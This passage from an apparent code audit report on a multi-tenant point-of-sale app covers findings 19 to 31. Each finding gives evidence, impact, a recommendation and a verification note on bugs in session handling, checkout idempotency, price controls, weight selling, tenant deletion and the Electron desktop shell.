- `App.vue` `onMounted` calls `checkForUpdates()` on every load, and the gate at l.96 is clear, so the modal opens again.
- The modal is a full-screen z-[9999] overlay. The X button (l.64) and "remind later" button (l.174) are hidden when forced, and the backdrop click calls `closeModal`, which also does nothing.

**Why this is worse than claimed**
- `StoreAppVersionDTO.php:27` defaults `min_version_code` to `version_code` when it is not supplied.
- `CheckAppUpdateAction.php:29` forces the update when `versionCode < min_version_code`.
- So any new Android version published without an explicit `min_version_code` is forced on every older client. The lockout is the default, not just a case where the super-admin chose to force it.

The only way out is installing the APK outside the app, so **high** stands.

### 19. [MEDIUM] 401 handler clears localStorage but not the Pinia auth store, which causes an infinite login/dashboard redirect loop
- **Location:** `D:\projects\sroor\backend\resources\js\Services\api.js:58`
- **Effort:** S
- **Evidence:** On 401, api.js removes auth_token, auth_user, auth_store and current_store_id from localStorage, then calls window.spaRouter.replace({name:'login'}). It never calls authStore.clearSession(). router/index.js:438 checks `if (to.meta.guestOnly && authStore.isAuthenticated) return next({name:'dashboard'})`. isAuthenticated reads in-memory state.token/state.user, which are still set. authStore.fetchMe(), the only other path that clears on 401, is not called anywhere in resources/js.
- **Impact:** When a token is revoked mid-session (user deactivated by admin, logout elsewhere, token deleted), the app bounces login -> dashboard -> 401 -> login repeatedly. It fires API calls in a loop and the cashier cannot log in again until a hard reload.
- **Recommendation:** In the 401 branch call useAuthStore().clearSession() (lazy import to avoid a cycle). Also reset appConfig.isLoaded and the tabs store. Guard with a single-flight flag so parallel 401s redirect once.
- **Verification:** The core defect is real, but "infinite loop" overstates it. In backend/resources/js/Services/api.js:58-72, the 401 handler only removes the localStorage keys and then calls window.spaRouter.replace({name:'login'}). It never resets the Pinia store. The auth store (stores/auth.js:18,28) reads token and user into memory once, and isAuthenticated reads that in-memory state, so it stays true. The only code that calls clearSession() is fetchMe on a 401 (auth.js:134, and fetchMe is never called), logout (auth.js:190), and the router's bootstrap catch (router/index.js:427). That catch only runs while !appConfigStore.isLoaded, so after bootstrap it is skipped. As a result, router/index.js:438 sends the guest-only login route back to 'dashboard', and nothing listens for storage events. The user can't reach the login screen after a token is revoked mid-session. Why it is not an infinite loop: vue-router treats a redirect to the route the user is already on as a duplicated navigation and does nothing. So the worst case is one bounce from the current page to the dashboard, a 401, and a no-op redirect. After that the user sits on a dashboard where every API call fails with 401, and polling would keep sending failing requests at its own interval, not in a tight loop. There is a recovery path without a hard reload: the logout button in SpaLayout.vue:680 and SuperAdminLayout.vue:46 calls authStore.logout(), which calls clearSession(). Actual impact: after a token is revoked or a user is deactivated, the app gets stuck on a broken dashboard instead of showing the login page, until the user logs out manually or reloads. That is a real UX and session-handling bug, but medium rather than high.

### 20. [MEDIUM] Any bootstrap failure, including offline or timeout, wipes the session; bootstrap is also fetched twice
- **Location:** `D:\projects\sroor\backend\resources\js\router\index.js:421`
- **Effort:** S
- **Evidence:** beforeEach: if authenticated and !isLoaded, it awaits fetchBootstrapContext(). The catch block is not limited to 401: `authStore.clearSession(); ... return next({ name: 'login' ...})`. App.vue:299-300 calls fetchBootstrapContext() again in onMounted for authenticated users, after app.js already waited for router.isReady() and the guard had loaded it. api.js has no handling for network errors or ECONNABORTED. The 30s timeout surfaces as raw axios English text via error.message (api.js:55).
- **Impact:** A POS tablet that reloads during a Wi-Fi drop or a slow server (>30s) logs the cashier out and drops the token. That is the opposite of the offline-tolerance a shop needs. Every authenticated cold start sends /system/context twice.
- **Recommendation:** In the guard, clear the session only when error.response?.status === 401. On network or timeout errors keep the session, render the shell with an offline banner and retry. Remove the duplicate call in App.vue, or gate it on !isLoaded. In api.js, map !error.response and ECONNABORTED to translated userMessage keys (common.network_error / common.timeout).
- **Verification:** Confirmed in code, but the impact is overstated. In backend/resources/js/router/index.js:421-430, beforeEach awaits appConfigStore.fetchBootstrapContext(). Its catch block does not check the error type: any failure (timeout, network error, 500, 502 or 503) runs authStore.clearSession(), which removes auth_token, auth_user, auth_store and current_store_id from localStorage (stores/auth.js:198-209), then sends the user to login. Other paths only clear on 401: fetchMe in auth.js:133 and the api.js:58 interceptor. So the guard is the outlier. appConfig.js:42-78 rethrows every error, so nothing upstream filters it. The double fetch is also real. app.js:40-41 mounts only after router.isReady(), so the guard has already finished the bootstrap. App.vue:115-116 (not 299-300 as the finding says) then calls fetchBootstrapContext() again in onMounted for authenticated users, so each authenticated cold start sends /system/context twice. api.js:12 sets a 30s timeout and api.js:55 falls back to the raw axios error.message. On this path it only goes to console.warn and is never shown to the user, so that part is minor.

Why I lowered it from high: the "reload during a full Wi-Fi drop" case is mostly moot. public/sw.js never writes to its cache, and capacitor.config.json loads a remote server.url, so a fully offline reload cannot load the SPA at all. The realistic triggers are a slow server (over 30s), transient 5xx/502 errors from the host, or a network drop between the HTML/JS loading and the /system/context call. In those cases the cashier is logged out and has to sign in again. That is bad UX, and it gets worse when the server is degraded. But no data is lost, and the server-side token is not revoked (it is only dropped locally). Medium is the right severity.

### 21. [MEDIUM] No idempotency on POS checkout: a timeout or network error followed by a retry can create duplicate invoices and double stock deductions
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:724`
- **Effort:** M
- **Evidence:** submitInvoice posts `api.post('/invoices', payload)` with no client request id or idempotency key. On error the cart is kept and the user is shown pos.checkout_failed, which invites a resubmit. The client timeout is 30000ms (api.js:12). grep for idempotency, client_uuid or request_id across resources/js and app/ returns nothing. The payload also has `store_id: activeStore.value?.id || 1` and uses parseFloat for discount_value and paid_amount.
- **Impact:** On slow links the server can commit the invoice after the client has already timed out. The cashier retries and the sale is recorded twice: double stock deduction, double treasury entry and a wrong shift cash balance. The `|| 1` fallback can also book a sale against store 1 when no store is resolved.
- **Recommendation:** Generate a UUID per order (store it in the parked order in usePosOrders) and send it as an Idempotency-Key header or client_uuid field. Backend-architect: add a unique column and return the existing invoice on replay. Remove the `|| 1` fallback and block checkout when there is no active store. Send money as strings.
- **Verification:** The finding holds up, but "high" overstates it. I checked the code and found nothing that makes a retried sale safe:

- **No idempotency anywhere.** `PosView.vue:707-724` posts `/invoices` without any client request id. A grep for idempotency, `client_uuid` and `request_id` across `backend/app` and `resources/js` finds only unrelated jobs, telescope and tenancy hits.
- **Error path invites a resubmit.** The client timeout is 30000 ms (`Services/api.js:12`). On error, `submitInvoice` keeps the cart and shows `pos.checkout_failed` (lines 737-739).
- **Server does not dedupe.** `InvoiceController::store` (`app/Http/Controllers/Api/InvoiceController.php:141-158`) calls `CreateSalesInvoiceAction` directly. The action has no duplicate or recent-submission check. The only unique constraint is `invoice_number`, which the server generates, so it cannot stop a duplicate.

A retry after a timeout where the server already committed therefore creates a second invoice, a second stock deduction and a second treasury entry.

Why I lowered it to medium:
- **Double-clicks are already blocked.** The `isSubmitting` flag is set at line 705, and the checkout buttons are disabled while it is set (`POSCheckoutPanel.vue:156,167`, `POSCheckoutSummary.vue:203`).
- **The duplicate needs a narrow sequence.** The server must commit, the client must then time out after 30 s or lose the connection, and the cashier must choose to resubmit.
- **The duplicate can be undone.** It stays visible and can be cancelled, which reverses its stock and account effect.

On the `store_id || 1` claim: the server reads the `X-Store-Id` header first (controller line 143), so the payload `store_id` is used only when that header is missing. In that case the server's fallback chain is the payload value (which can be the hard-coded 1), then the user's current store, then the main store. So booking a sale to store 1 is possible only when no store is resolved at all, which is an edge case.

On `parseFloat` for `discount_value` and `paid_amount`: this is a minor money-handling smell, not part of the duplicate-invoice impact.

### 22. [MEDIUM] The 'smart_wallet' payment method chip always fails server validation (422)
- **Location:** `D:\projects\sroor\backend\resources\js\Components\POS\POSCheckoutPanel.vue`
- **Effort:** S
- **Evidence:** The chips emit keys `cash`, `instapay` and `smart_wallet`. StoreSalesInvoiceRequest validates `payment_method` as `in:cash,instapay,e_wallet,visa,bank_transfer`.
- **Impact:** Any sale where the cashier picks the wallet chip is rejected with a validation error at checkout, which blocks wallet sales at the counter.
- **Recommendation:** Use `e_wallet` (or a shared enum delivered via appConfig) on the client. Keep the method list in a single backend enum that is exposed to the SPA.
- **Verification:** The finding is real. I traced the full path in the code:

1. **The chip sends `smart_wallet`.** `backend/resources/js/Components/POS/POSCheckoutPanel.vue:101-104` emits `update:paymentMethod` with the key `smart_wallet`. `PosView.vue:75` binds this with `v-model:payment-method`, and `PosView.vue:262-264` stores the raw value with no mapping.
2. **The value is posted unchanged.** In `submitInvoice` (`PosView.vue:711`), the payload sets `payment_method: paymentType === 'credit' ? null : paymentMethod.value`. `PosView.vue:724` then calls `api.post('/invoices', payload)`. The base URL is `/api/v1` (`Services/api.js:7`), so the request goes to `routes/api.php:105`, which is `InvoiceController@store`.
3. **The server rejects it.** `InvoiceController.php:141` uses `StoreSalesInvoiceRequest`. Its `prepareForValidation` only fills in a default `customer_id` and never normalizes the payment method. Its rules (`StoreSalesInvoiceRequest.php:45`) are `'payment_method' => ['nullable','string','in:cash,instapay,e_wallet,visa,bank_transfer']`. So `smart_wallet` fails with a 422 every time.

**A guard exists, but on another endpoint.** `StorePOSInvoiceRequest.php:30-31` maps `smart_wallet` to `e_wallet`. That request is only used by `/api/v1/pos/checkout` (`Api\PosController@checkout`) and `/pos/invoices` (tenant web route). The Vue SPA calls neither, so the fix never runs for this chip. Other components (`POSCheckoutSummary.vue`, `POSMultiPaymentModal.vue`) correctly use `e_wallet`, which supports that `smart_wallet` is a key mismatch and not intended.

**Why I lowered it to medium:**
- It only affects the wallet chip, and only for cash or partial sales. Credit sales send `null`.
- Cash and InstaPay still work.
- Wallet sales are not fully blocked. A cashier can use the multi-payment modal, which uses `e_wallet` for split lines; the main `payment_method` then stays on whichever chip is selected, such as `cash`.
- The failure is loud (an error popup), so there is no silent data corruption or money loss.

It is a clear functional bug in a core POS flow, but not a high-severity one.

### 23. [MEDIUM] Cashier can set any unit price (including 0) with no permission gate and no server floor
- **Location:** `D:\projects\sroor\backend\resources\js\Components\POS\POSCartTable.vue`
- **Effort:** M
- **Evidence:** The editable `<input type="number" :value="item.unit_price" min="0">` is always rendered. PosView.onCartPriceUpdate accepts any value >= 0. InvoiceService::confirmInvoice uses `$unitPrice = (string)$line['unit_price']`, and grep found no min_selling_price/selling_price check anywhere in the service.
- **Impact:** Any user with pos.access can sell below cost or at zero. For a sellable multi-branch SaaS this is a cash-leakage and fraud vector, and owners cannot restrict it.
- **Recommendation:** Gate price editing on a permission such as `pos.edit_price` (auth store) and show it read-only otherwise. Backend: enforce min_selling_price unless the user has an override permission, and audit-log price overrides.
- **Verification:** The finding holds. I checked the whole checkout path and found no price check at any step:

1. **Cart screen** (`POSCartTable.vue` lines 114-121 and 230-235): the price input is always shown and has no permission check.
2. **Price handler** (`PosView.vue:548-551`): `onCartPriceUpdate` accepts any value of 0 or more.
3. **Server validation** (`StorePOSInvoiceRequest.php:83`): the only rule is `items.*.unit_price => ['required','numeric','min:0']`, so 0 passes. `authorize()` lets in anyone who is admin or has `pos.access` or `invoices.create`. There is no separate permission for changing a price.
4. **Controller and action**: `Api/PosController::checkout` builds `POSInvoiceDTO`, then calls `ProcessPOSInvoiceAction::execute`, which goes straight to `InvoiceService::confirmInvoice`.
5. **Invoice service**: `InvoiceService.php:72` uses `$unitPrice = (string)$line['unit_price']` and saves it at line 94. It never compares the price with `min_selling_price`, `selling_price` or cost.
6. **Other places a guard could live**: a search of `app/` for `min_selling_price` finds it only in the model, resources, DTO and item create/update code, never in a sale check. No observer on `InvoiceItem` checks the price, and no middleware or setting covers it (I searched for edit/override/allow-price permissions and settings and found none).

The POS sends `min_selling_price` to the browser, but only to label the "wholesale" price badge. It is never enforced.

I lowered the severity from high to medium:
- A cashier with POS access is already a trusted person handling cash, and editing prices by hand is a normal POS feature.
- Each sale records `user_id` and `cost_price`/`total_cost`, so below-cost sales still appear in profit reports and can be traced to the cashier. This is a missing business control, not a privilege escalation or a hole between tenants or stores.
- It is still a real gap for a multi-branch product sold to shop owners. Owners cannot limit price changes or set a price floor.

### 24. [MEDIUM] Selling by weight is effectively unsupported: POSWeightPickerModal and POSNumpad are dead code; qty steppers are integer-only
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:536`
- **Effort:** L
- **Evidence:** Nothing imports POSWeightPickerModal, POSNumpad, POSItemCard or POSCartItem (grep). PosView's addToCart always adds `qty=1`. `+`/`-` move by 1, and decrease removes the line when qty <= 1, so a 0.5 kg line is deleted on '-'. The cart qty inputs are `step="1" min="1"`. Items have no barcode column and no is_weighted flag (grep of tenant migrations), and POSHeader has no scale/EAN-13 weight-barcode parsing. The weight modal's custom input does `parseFloat` without rounding to 3 decimals, and its label says 'grams or kilos' with no unit conversion. formatQty/formatMoney print at most 2 decimals, so 0.125 kg shows as 0.13.
- **Impact:** Per-kilo shops (a core target segment) cannot ring up 250 g quickly, cannot scan scale labels, and the receipt shows rounded weights that do not match the line total.
- **Recommendation:** Wire the weight picker for weight units (add an `is_weighted`/`sale_unit` field on the item via backend-architect instead of the hardcoded Arabic unit list in InvoiceService). Use fractional steps for weighted items. Round qty to 3 decimals before sending. Add weight-barcode parsing (prefix, item code, grams). Make formatQty show 3 decimals.
- **Verification:** Most of the evidence checks out in the code, but "effectively unsupported" goes too far.

Confirmed:
- Nothing in backend/resources/js imports POSWeightPickerModal, POSNumpad, POSItemCard or POSCartItem. The files exist in Components/POS and are dead code.
- PosView.vue:491 `addToCart(item, qty = 1)` is only ever called with the default qty of 1.
- PosView.vue:536-543: `+` and `-` change qty by 1. `decreaseCartItemQty` calls removeFromCart whenever qty <= 1, so pressing `-` on a 0.5 kg line deletes the line.
- POSCartTable.vue:97-98 and 213-214 set the qty input to `step="1" min="1"`.
- The tenant items migration (2026_08_08_160001_create_items_table.php) has no barcode or is_weighted column. It only has `code` (unique) and `unit` (default 'كجم').
- No component in Components/POS (including POSHeader) parses EAN-13 or scale barcodes.
- In POSWeightPickerModal.vue:48 the custom weight is a bare parseFloat. Its label uses the 'grams_or_kilos' key, and I found no unit conversion.
- formatQty and formatMoney in useFormatters.js and useMoney.js cap output at 2 decimals, so 0.125 displays as 0.13.

Why it is overstated:
- The cart qty input is `type=number` bound with `@input` to `onCartQtyUpdate` (PosView.vue:544-547), which accepts any parsed value > 0.
- `step="1"` only affects the spinner and form validity. It does not stop a cashier typing 0.25.
- So fractional (kilo) quantities can be entered and sent to the backend, which stores qty as DECIMAL(12,3).

Selling by weight therefore works, but slowly and with bugs: no quick weight presets, no scale-label scanning, `-` deletes fractional lines, and the receipt shows weights rounded to 2 decimals. That is a real UX and correctness gap for a target segment, but it is not a blocker, so I rate it medium rather than high.

### 25. [MEDIUM] 45 imports use 'services/' but the folder is 'Services/', so a Linux (case-sensitive) build will fail
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useCustomers.js:2`
- **Effort:** S
- **Evidence:** `ls resources/js` shows the folder 'Services' (git ls-files: backend/resources/js/Services/api.js). grep finds 45 imports written as '../services/api' or '../../services/api' (all composables, plus LoginView, ItemsView, InvoicesView, StoresView, CategoriesView, StockTransfersView, DashboardView, InvoicePrintView, WorkspaceConnectView). Only one import (POSQuickCustomerModal) uses '@/Services/'. git core.ignorecase=true, and the compiled backend/public/build is committed, which means builds only happen on Windows.
- **Impact:** `npm run build` fails on any Linux CI or server (the GitHub workflow uses ubuntu-latest, and Hostinger runs Linux) with 'Could not resolve ../services/api'. Releases depend on a developer's Windows machine and committed build output, which blocks a reproducible SaaS pipeline.
- **Recommendation:** Normalize every import to '@/Services/api' (or rename the folder through git mv with a temporary name). Add a Linux `npm run build` step to CI.
- **Verification:** The casing mismatch is real. Git tracks the folder only as backend/resources/js/Services/ (api.js, customerService.js, posService.js). No lowercase 'services' path exists in the index. `grep -rnE "from ['\"][./]*services/" backend/resources/js` returns exactly 45 imports, for example Composables/useActivityLogs.js:2 and useAppUpdate.js:4, which import '../services/api'. Only Components/POS/POSQuickCustomerModal.vue:3 uses '@/Services/customerService'. Nothing in backend/vite.config.js would hide the mismatch: its only alias is '@' -> resources/js, and there is no case-insensitive resolver. core.ignorecase is true. On a case-sensitive filesystem (Linux, a Docker build, Hostinger) Rollup cannot resolve '../services/api', so `npm run build` fails there.

The impact is overstated, though. The only CI file, .github/workflows/deploy.yml, never runs npm or vite. Its test job runs composer and `php artisan test`, and its deploy job only curls a webhook. CI does not fail today. Production is served from the committed backend/public/build, which is built on Windows, so nothing is broken right now. This is a latent build break that blocks a reproducible or Linux-based asset pipeline and makes releases depend on a developer's Windows machine. It does not cause any current production or CI failure, so medium fits better than high.

Separate note: .github/workflows/deploy.yml, around lines 47-48, contains a hardcoded deploy-webhook token in plain text in the curl URL (secret type: deployment webhook auth token; value not reproduced).

### 26. [MEDIUM] Super-admin tenant delete (drops the tenant database) uses a generic one-click 'Confirm deletion' dialog
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useSuperAdminTenants.js:174`
- **Effort:** S
- **Evidence:** confirmDeleteTenant shows DarkSwal with title t('super.delete_version_confirm_title') ('Confirm Deletion', which is the app-versions key) and text tenant.name, then calls api.delete('/super-admin/tenants/{id}'). TenancyServiceProvider:39-41 attaches Jobs\DeleteDatabase to TenantDeleted. The dedicated keys super.delete_tenant_confirm_title/desc/btn ('Permanently Delete Tenant? ... Cannot be undone!') exist, and only useSuperAdminTenantShow.js uses them. There is no typed-name confirmation in either flow.
- **Impact:** A misclick in the tenants list permanently drops a paying customer's whole database (sales, stock, treasury), and nothing in the dialog warns how severe that is.
- **Recommendation:** Use the delete_tenant_* keys and require the operator to type the tenant slug (Swal input that must match). Better still, have the backend soft-suspend first and only hard-delete after a grace period with a backup.
- **Verification:** The code confirms the finding. useSuperAdminTenants.js:174-186 builds the delete dialog from `super.delete_version_confirm_title` ("Confirm Deletion" / "تأكيد الحذف"), which is the app-versions key also used in useSuperAdminAppVersions.js:114. The dialog body is just `tenant.name`, and the buttons are the generic `common.yes` / `common.cancel`. It then calls `api.delete('/super-admin/tenants/{id}')`. SuperAdminTenantsView.vue:47 wires this to the row's @delete-tenant event.

On the backend, nothing softens the delete. api.php:201 routes to SuperAdminApiController::destroyTenant (lines 247-263), which calls DeleteTenantAction. That action deletes the domains and then calls `$tenant->delete()` inside DB::transaction. The Tenant model (app/Models/Tenant.php:10) does not use SoftDeletes. TenancyServiceProvider:39-44 runs Jobs\DeleteDatabase synchronously on TenantDeleted (shouldBeQueued(false)). The controller has no guard against deleting an active or paying tenant and no backup step. The stronger keys `super.delete_tenant_confirm_title/desc/btn` exist in lang/ar and lang/en, but only useSuperAdminTenantShow.js:186-192 uses them. Neither flow asks the admin to type the tenant name.

Why I lowered it from high: the action still needs two deliberate clicks (the row action, then "Yes" in a SweetAlert that has a warning icon, a Cancel button and the tenant's name). It is also limited to super-admins. So this is missing hardening and misleading wording on an irreversible action, not an unguarded one-click delete. It still matters because the result is a permanent database drop with no soft-delete or backup. A related issue: the controller returns hardcoded Arabic messages at lines 255 and 260, which breaks the localization rule.

### 27. [MEDIUM] Failed list loads look like 'no data': no error state or retry in any list view
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useCustomers.js:76`
- **Effort:** M
- **Evidence:** The fetch catch blocks only run console.error and then set isLoading=false (useCustomers.js:76-79; the same pattern is in useStoreStocks, useReports, useReturns, useDailyJournal, useInvoiceShow, and others). Grepping views, Components and Composables for retry, loadError, fetchError or hasError finds nothing outside Form inputs and WorkspaceConnectingState. Coverage scan: every list view has skeletons and EmptyState (CustomersView sk=12 empty=8, InvoicesView 14/4, and so on), and every view has 0 error-state hits. api.js shows a toast only for 403 and attaches userMessage. It shows no toast for 500 or network errors on GET.
- **Impact:** When the server or network fails, a cashier or manager sees the 'no customers / no invoices' empty state and may assume the data was lost or re-enter it. This matters most on flaky tablet and phone connections.
- **Recommendation:** Add a shared `error` ref to the fetching composables and a Common/ErrorState.vue with a retry button that re-runs fetch. Render it in place of EmptyState when error is set.
- **Verification:** The finding is real. In backend/resources/js/Composables/useCustomers.js:76-80, the catch block in fetchCustomers only calls console.error and then clears isLoading in finally. customers.value keeps its initial [], so the view falls through to its empty state. The same catch pattern appears in other list loaders: useStoreStocks.js:66, useReturns.js:67, useDailyJournal.js:69, useReports.js:138, usePurchases.js:65, useExpenses.js:86, useSuperAdminTenants.js:65, and InvoicesView.vue:143 (InvoicesView fetches inline). The global interceptor in Services/api.js:48-97 does not cover these failures. It redirects on 401 and shows a Swal only on 403. For other statuses and for network or timeout errors (where status is null), it only attaches error.userMessage and rejects, so a 500 or a network failure on a GET is completely silent. The only connectivity indicator is in DesktopTitlebar.vue (isOnline, from useDesktopHardware), which exists only in Electron. useNativeBridge also tracks online state, but no view reads it, so the web and PWA have no offline signal. Grepping for retry, loadError, fetchError and hasError finds no list error state. One part of the evidence is overstated: useInvoiceShow.js:79-80 does set error.value, but it is a detail view, not a list. There is also a nuance. On a refetch (page, filter or search change), the old rows are not cleared, so the user sees stale data rather than the empty state. That is still misleading but is not 'no data'. The claimed impact is also speculative. No data is lost, and the risk that users re-enter records because they think data vanished is a UX assumption, not a demonstrated problem. This is a real cross-cutting UX gap and it breaks the project's own rule in .claude/rules/frontend-vue.md ('Empty & error states via EmptyState'). It involves no integrity or security risk, so medium fits better than high.

### 28. [MEDIUM] Super-admin calls carry the stale X-Tenant header, so platform settings, units and plans hit a tenant DB
- **Location:** `D:\projects\sroor\backend\resources\js\Services\api.js:31`
- **Effort:** M
- **Evidence:** api.js always sends X-Tenant from localStorage('tenant_id'). LoginView's central mode (?central=1) does not clear it, and the 401 handler does not remove it. SuperAdminApiController::getPlatformSettings, updatePlatformSettings, getUnits and updateUnits use Setting::get/set, and Setting has no pinned connection. Per .claude/rules/multi-tenancy.md, Plan, PlanFeature and Subscription are not pinned either. GetTenantDetailsAction also calls Tenancy::end() inside the try block, so a failure leaves tenancy initialized while Setting::get('global_system_units') runs.
- **Impact:** A super admin who once connected to a workspace on the same browser or device writes 'platform' branding and global units into that customer's settings table. Plan pages may fail with 'table not found'. Platform settings silently diverge.
- **Recommendation:** Frontend: do not send X-Tenant on /super-admin/* requests, and clear workspace keys when entering central login. Backend: pin central models and make super-admin routes refuse to run when tenancy is initialized. Move Tenancy::end() into a finally block.
- **Verification:** The code confirms the finding. backend/resources/js/Services/api.js:31-34 always sends X-Tenant from localStorage('tenant_id'). Only switchWorkspace() at LoginView.vue:379 clears that key. Central mode (?central=1, LoginView.vue:365-367) does not clear it, and neither do the 401 handler (api.js:59-63) nor authStore.clearSession.

On the server, ResolveApiTenancy.php:30-37 runs on the whole /api/v1 group, including /super-admin/* and /auth/login (routes/api.php:19,196). It initializes tenancy from that header whenever it is present. Only /central/* routes skip this.

So with a stale tenant_id, the "central" login request lands in the tenant DB. ApiLoginAction.php:37-58 then auto-provisions the central admin as a tenant user with the admin role (firstOrCreate by phone). Every later super-admin call runs in tenant context.

The super-admin gate does not stop this for the platform owners. In AppServiceProvider.php:37-42, Gate::before returns true for the super_admin role or the two hard-coded phone numbers. Those values carry over to the provisioned tenant user, and UserResource sets is_super_admin the same way, so the SPA redirects to /super-admin/dashboard.

What happens next:
- SuperAdminApiController getPlatformSettings/updatePlatformSettings/getUnits/updateUnits (lines 323-390) call Setting::get/set. Setting has no pinned connection, and a tenant settings table exists (database/migrations/tenant/2026_08_10_221000_create_settings_table.php). The writes therefore go into the customer's DB, including app_name, which renames the customer's app.
- Plan has no pinned connection, and the plans tables exist only in central migrations, so the plans pages would fail with "table not found".
- GetTenantDetailsAction.php:33-53 calls Tenancy::end() inside try (line 52), so an exception skips it before Setting::get('global_system_units') on line 57. This is also confirmed.

Why severity drops from high to medium:
- It needs a specific state: a stale workspace in the same browser, then a direct /login?central=1.
- The gate only passes for owners who have the super_admin role or a hard-coded phone. Other central admins get 403 on super-admin routes.
- Only a trusted platform admin's own actions trigger it, not an attacker. The result is cross-tenant settings corruption plus an unwanted admin account in the customer's DB, not data exfiltration.

### 29. [MEDIUM] Electron config:save-settings lets any loaded page repoint the app to an arbitrary server permanently
- **Location:** `D:\projects\sroor\desktop\main.js:508`
- **Effort:** S
- **Evidence:** ipcMain.handle('config:save-settings') merges any object into the JSON settings file, then calls mainWindow.loadURL(newSettings.serverUrl...). The serverUrl value is not validated, and the sender origin is not checked. WorkspaceConnectView.vue l.74 passes data.server_url from the resolve API. LoginView.vue l.386 also calls it.
- **Impact:** Combined with an XSS or a bad resolver response, this hijacks the desktop app across restarts. It also lets the page turn on kiosk mode or change thermalPrinterName.
- **Recommendation:** Whitelist which keys the renderer may set. Validate serverUrl (https, allowed domain suffix or an exact match to a resolver-issued domain). Check event.senderFrame origin.
- **Verification:** The mechanism is real, but it is a hardening gap that only matters once the renderer is already compromised.

What the code shows:
- desktop/main.js:508-520: `config:save-settings` passes the whole renderer object to `settingsStore.saveSettings(newSettings)`. It does not check `event.senderFrame` or the origin, and it has no key allowlist.
- desktop/src/config/settingsStore.js `saveSettings` merges that object into sroor-desktop-config.json and writes it to disk. Any key is accepted, including `serverUrl`, `kioskMode` and `thermalPrinterName`.
- `serverUrl` is not checked for scheme or host. main.js:516 calls `mainWindow.loadURL(dest)` directly.
- main.js:73 (`getTargetAppUrl`) reads the stored `serverUrl` on every launch, so a changed URL survives restarts.
- desktop/preload.js:32 exposes `saveSettings` to any page loaded in the main window.
- The `will-navigate` handler at main.js:238-240 is empty. Navigation is not limited to *.baraa-solutions.com, so a foreign page loaded in the window would also get the preload bridge.
- The callers are as claimed. WorkspaceConnectView.vue:74-75 passes `data.server_url` from `/central/tenants/resolve` without checking it, and LoginView.vue:386 also calls `saveSettings`.
- `kioskMode` is persisted and read at main.js:131. It takes effect on the next launch.

Why medium and not high:
- Exploiting it needs code running in the renderer (XSS in the SPA) or a malicious response from the vendor's own central resolver. The resolver is first-party, not attacker input.
- `contextIsolation` is true and `nodeIntegration` is false (main.js:150-151), so there is no direct escalation to Node.
- Once XSS exists, the same bridge exposes more serious sinks. The most serious is `updater:download-and-install` (main.js:539-541), which takes an arbitrary `downloadUrl`. Against that, this finding mainly adds persistence and URL hijacking.

Fix: restrict `serverUrl` to https on the expected domain, allowlist the keys that can be saved, validate the sender frame's origin, and make `will-navigate` and `setWindowOpenHandler` block foreign origins.

### 30. [MEDIUM] Desktop version comparison uses the web bundle build number, not the installed EXE version
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useAppUpdate.js:56`
- **Effort:** S
- **Evidence:** In syncClientVersionInfo for Electron, the app reads electronAPI.getAppVersion() (package.json 1.0.0) and then overwrites both values with versionData.version and build_number (1.0.135 / 135) from resources/js/version.json. That file is served by the remote server, not by the installed shell. The server compares windows version_code to that number (CheckAppUpdateAction l.28).
- **Impact:** The installed desktop shell version is never reported. If a windows release has version_code ≤ web build number, it is never offered. If it is higher, it is offered again after installation until the next web deploy bumps build_number, which loops endlessly under force update. Each web deploy also silently changes what desktop clients claim to run.
- **Recommendation:** For Electron, report app.getVersion() and a shell build code from main (for example an extraMetadata buildNumber). Keep web version.json for the web channel only. Android already uses CapacitorApp.getInfo().build correctly.
- **Verification:** Confirmed in code. In backend/resources/js/Composables/useAppUpdate.js:50-61, the Electron branch reads electronAPI.getAppVersion() (desktop/main.js:524 returns app.getVersion(), and desktop/package.json:3 is "1.0.0"). It then overwrites currentVersionName and currentVersionCode with versionData.version and build_number from resources/js/version.json (currently 1.0.135 / 135). The shell's own version is never reported, and there is no installed build code at all. The Electron shell loads the remote tenant URL (desktop/main.js:42-47, 246: https://{tenant}.baraa-solutions.com), so version.json comes from the server's web bundle, not from the installed EXE. checkForUpdates sends that number as version_code (l.108-113). AppUpdateController::checkVersion passes it to CheckAppUpdateAction, which uses has_update = latest.version_code > dto.versionCode (l.28), and the client re-checks serverLatestCode > currentVersionCode (l.118). The claimed impact follows from this. A windows release with version_code <= the web build_number is never offered. A higher one is offered again after a successful install until the next web deploy raises build_number. Under force_update, closeModal (l.253) refuses to close, so the user is stuck in a re-prompt loop. I found no guard elsewhere: no server-side mapping and no use of the shell version for the comparison. I lowered the severity from high to medium because this is a functional update-flow bug, not a data, money or security issue. The worst case (a forced-update loop that blocks a desktop POS) also needs an admin to publish a windows release with a version_code above the web build number and mark it force.

### 31. [MEDIUM] Cash drawer 'kick' sends no ESC/POS pulse: it silently prints an almost blank page
- **Location:** `D:\projects\sroor\desktop\src\hardware\cashDrawer.js:11`
- **Effort:** M
- **Evidence:** The comment says 'ESC p 0 25 250 (HEX: 1B 70 00 19 FA)', but the code sends an HTML div containing '.' to printerManager.printThermalSilent. That goes through the Windows print driver as a normal 80mm job, and no raw bytes are sent. The same applies to the F12 menu, the tray and the context-menu actions in main.js/appMenu.js.
- **Impact:** The drawer only opens if the printer driver is set to 'open drawer on every print'. Otherwise cashiers get a blank receipt each time and no drawer. That is a real POS operation failure plus wasted paper.
- **Recommendation:** Send raw ESC/POS bytes through a RAW print job, for example a small native helper, node-thermal-printer or a raw-spooler module, or Windows RAW via the printer port. Fall back to the driver option only when explicitly configured. Keep Arabic receipts on the HTML/Chromium path, which already renders RTL glyph shaping correctly.
